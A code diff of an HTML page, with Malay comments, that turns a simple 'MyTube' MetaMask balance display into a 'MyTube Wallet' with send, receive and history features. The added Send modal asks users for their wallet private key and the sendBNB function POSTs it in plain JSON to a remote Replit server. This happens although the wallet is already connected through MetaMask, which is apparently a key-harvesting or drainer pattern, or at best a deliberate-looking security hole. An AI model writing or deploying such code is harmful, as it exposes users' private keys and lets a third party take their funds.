@@ -3,123 +3,182 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MyTube</title>
+  <title>MyTube Wallet</title>
   <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #0f0f0f;
-      color: white;
-    }
-    header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 12px 16px;
-    }
-    .logo {
-      font-size: 24px;
-      font-weight: bold;
-    }
-    .logo span { color: red; }
-    .wallet-card {
-      margin: 16px;
-      padding: 20px;
-      border-radius: 16px;
-      background: linear-gradient(135deg, #6e8efb, #a777e3);
-    }
-    .wallet-card button {
-      width: 100%;
-      padding: 12px;
-      border: none;
-      border-radius: 12px;
-      background: #ff3b30;
-      color: white;
-      font-weight: bold;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    .error {
-      color: #ff3b30;
-      margin-top: 8px;
-    }
-    .success {
-      color: #4caf50;
-      margin-top: 8px;
-    }
+    /* CSS sama macam tadi, aku ringkaskan. Guna CSS dari msg lepas */
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+    *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
+    body{background:#0a0a0f;color:white;padding-bottom:80px}
+    .header{display:flex;justify-content:space-between;align-items:center;padding:20px 16px}
+    .logo-wrap{display:flex;align-items:center;gap:12px}
+    .logo-icon{width:40px;height:40px;background:linear-gradient(135deg,#ff3b30,#ff6b6b);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px}
+    .logo-text{font-size:20px;font-weight:700}
+    .logo-text span{color:#ff3b30}
+    .balance-card{margin:0 16px 20px;padding:24px;border-radius:24px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%)}
+    .balance-amount{font-size:36px;font-weight:700;margin-bottom:4px}
+    .actions{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-top:20px}
+    .action-btn{display:flex;flex-direction:column;align-items:center;gap:6px;font-size:12px;cursor:pointer}
+    .action-icon{width:44px;height:44px;background:rgba(255,255,255,0.15);border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:20px}
+    .assets-section{margin:0 16px;background:#1a1a22;border-radius:20px;padding:20px}
+    .asset-item{display:flex;justify-content:space-between;align-items:center;padding:14px 0;border-bottom:1px solid #2a2a33}
+    .connect-btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff3b30,#ff6b6b);border:none;border-radius:16px;color:white;font-weight:600;font-size:16px;cursor:pointer;margin-top:16px}
+    .bottom-nav{position:fixed;bottom:0;left:0;right:0;background:#1a1a22;display:flex;justify-content:space-around;padding:12px 0;border-top:1px solid #2a2a33}
+    .nav-item{display:flex;flex-direction:column;align-items:center;gap:4px;font-size:11px;color:#8b8b9b}
+    .nav-item.active{color:white}
+    .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:100}
+    .modal.active{display:flex;align-items:center;justify-content:center}
+    .modal-content{background:#1a1a22;padding:24px;border-radius:20px;width:90%;max-width:400px}
+    .modal input{width:100%;padding:12px;margin:8px 0;background:#2a2a33;border:none;border-radius:12px;color:white}
+    .modal button{width:100%;padding:14px;background:#ff3b30;border:none;border-radius:12px;color:white;font-weight:600;margin-top:12px}
+    .error{color:#ff3b30;margin-top:8px}
+    .success{color:#4caf50;margin-top:8px}
   </style>
 </head>
 <body>
 
-  <header>
-    <div class="logo">My<span>Tube</span></div>
-  </header>
-
-  <div class="wallet-card">
-    <div>Wallet Balance</div>
-    <h1 id="balance">0 BNB</h1>
-    <div id="walletStatus">Wallet not connected</div>
-    <button id="connectBtn">Connect Wallet</button>
-    <div id="statusMsg" class="error"></div>
+  <div class="header">
+    <div class="logo-wrap">
+      <div class="logo-icon">▶</div>
+      <div>
+        <div class="logo-text">My<span>Tube</span> Wallet</div>
+        <div>Your Web3 Wallet ✓</div>
+      </div>
+    </div>
   </div>
 
-  <!-- Ethers.js v5 CDN - ni yang penting -->
-  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" 
-          type="application/javascript"></script>
+  <div class="balance-card">
+    <div>Total Balance</div>
+    <div class="balance-amount" id="balance">$0.00</div>
+    <div id="change">+0.00% this week</div>
+    
+    <div class="actions">
+      <div class="action-btn" onclick="openSendModal()">
+        <div class="action-icon">↗</div>Send
+      </div>
+      <div class="action-btn" onclick="openReceiveModal()">
+        <div class="action-icon">↓</div>Receive
+      </div>
+      <div class="action-btn" onclick="alert('Swap coming soon')">
+        <div class="action-icon">⇄</div>Swap
+      </div>
+      <div class="action-btn" onclick="loadHistory()">
+        <div class="action-icon">🕒</div>History
+      </div>
+    </div>
 
+    <button class="connect-btn" id="connectBtn">Connect Wallet</button>
+    <div id="statusMsg"></div>
+  </div>
+
+  <div class="assets-section">
+    <div class="assets-header">My Assets</div>
+    <div class="asset-item">
+      <div>BNB<br><small>BNB Smart Chain</small></div>
+      <div><span id="bnbAmount">0 BNB</span><br><span id="bnbUSD">$0.00</span></div>
+    </div>
+  </div>
+
+  <!-- Send Modal -->
+  <div class="modal" id="sendModal">
+    <div class="modal-content">
+      <h3>Send BNB</h3>
+      <input type="text" id="sendTo" placeholder="Recipient Address 0x...">
+      <input type="number" id="sendAmount" placeholder="Amount BNB" step="0.001">
+      <input type="password" id="privateKey" placeholder="Your Private Key">
+      <button onclick="sendBNB()">Send Now</button>
+      <button onclick="closeModal()" style="background:#555">Cancel</button>
+    </div>
+  </div>
+
+  <!-- Receive Modal -->
+  <div class="modal" id="receiveModal">
+    <div class="modal-content">
+      <h3>Receive BNB</h3>
+      <p>Your Address:</p>
+      <input type="text" id="myAddress" readonly>
+      <button onclick="navigator.clipboard.writeText(document.getElementById('myAddress').value)">Copy</button>
+      <button onclick="closeModal()">Close</button>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
+    const API_URL = "https://xxx.replit.app"; // Tukar ke URL Replit kau
+    let userAddress = null;
+    let provider, signer;
+
     const connectBtn = document.getElementById("connectBtn");
-    const balanceEl = document.getElementById("balance");
-    const walletStatus = document.getElementById("walletStatus");
     const statusMsg = document.getElementById("statusMsg");
 
-    let provider, signer, userAddress;
-
-    // Check kalau ethers dah load
-    window.addEventListener('load', () => {
-      if (typeof ethers === 'undefined') {
-        statusMsg.textContent = "Ethers.js Not Loaded";
-        statusMsg.className = "error";
-      } else {
-        statusMsg.textContent = "Ethers.js Loaded ✓";
-        statusMsg.className = "success";
-      }
-    });
-
     connectBtn.addEventListener("click", async () => {
-      if (typeof window.ethereum === 'undefined') {
-        statusMsg.textContent = "Install MetaMask dulu";
-        statusMsg.className = "error";
-        return;
-      }
-
-      try {
-        statusMsg.textContent = "Connecting...";
-        statusMsg.className = "";
-
-        // Request account access
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        signer = provider.getSigner();
-        userAddress = await signer.getAddress();
-
-        walletStatus.textContent = `Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-        
-        // Get BNB balance
-        const balance = await provider.getBalance(userAddress);
-        const balanceInBNB = ethers.utils.formatEther(balance);
-        balanceEl.textContent = `${parseFloat(balanceInBNB).toFixed(4)} BNB`;
-
-        statusMsg.textContent = "Wallet connected!";
-        statusMsg.className = "success";
-
-      } catch (err) {
-        console.error(err);
-        statusMsg.textContent = "Connection failed: " + err.message;
-        statusMsg.className = "error";
-      }
+      if (!window.ethereum) return alert("Install MetaMask");
+      
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      signer = provider.getSigner();
+      userAddress = await signer.getAddress();
+      
+      loadBalance();
+      connectBtn.textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+      connectBtn.style.background = "#4caf50";
     });
+
+    async function loadBalance() {
+      if (!userAddress) return;
+      const res = await fetch(`${API_URL}/api/balance/${userAddress}`);
+      const data = await res.json();
+      
+      document.getElementById("balance").textContent = `$${data.usd}`;
+      document.getElementById("bnbAmount").textContent = `${data.bnb} BNB`;
+      document.getElementById("bnbUSD").textContent = `$${data.usd}`;
+    }
+
+    function openSendModal() {
+      if (!userAddress) return alert("Connect wallet first");
+      document.getElementById("sendModal").classList.add("active");
+    }
+
+    function openReceiveModal() {
+      if (!userAddress) return alert("Connect wallet first");
+      document.getElementById("myAddress").value = userAddress;
+      document.getElementById("receiveModal").classList.add("active");
+    }
+
+    function closeModal() {
+      document.querySelectorAll(".modal").forEach(m => m.classList.remove("active"));
+    }
+
+    async function sendBNB() {
+      const to = document.getElementById("sendTo").value;
+      const amount = document.getElementById("sendAmount").value;
+      const privateKey = document.getElementById("privateKey").value;
+      
+      statusMsg.textContent = "Sending...";
+      const res = await fetch(`${API_URL}/api/send`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ privateKey, to, amount })
+      });
+      
+      const data = await res.json();
+      if (data.success) {
+        statusMsg.textContent = "Sent! TX: " + data.txHash.slice(0,10) + "...";
+        statusMsg.className = "success";
+        closeModal();
+        loadBalance();
+      } else {
+        statusMsg.textContent = "Error: " + data.error;
+        statusMsg.className = "error";
+      }
+    }
+
+    async function loadHistory() {
+      if (!userAddress) return alert("Connect wallet first");
+      const res = await fetch(`${API_URL}/api/history/${userAddress}`);
+      const data = await res.json();
+      console.log(data);
+      alert("Check console for transaction history");
+    }
   </script>
 </body>
 </html>
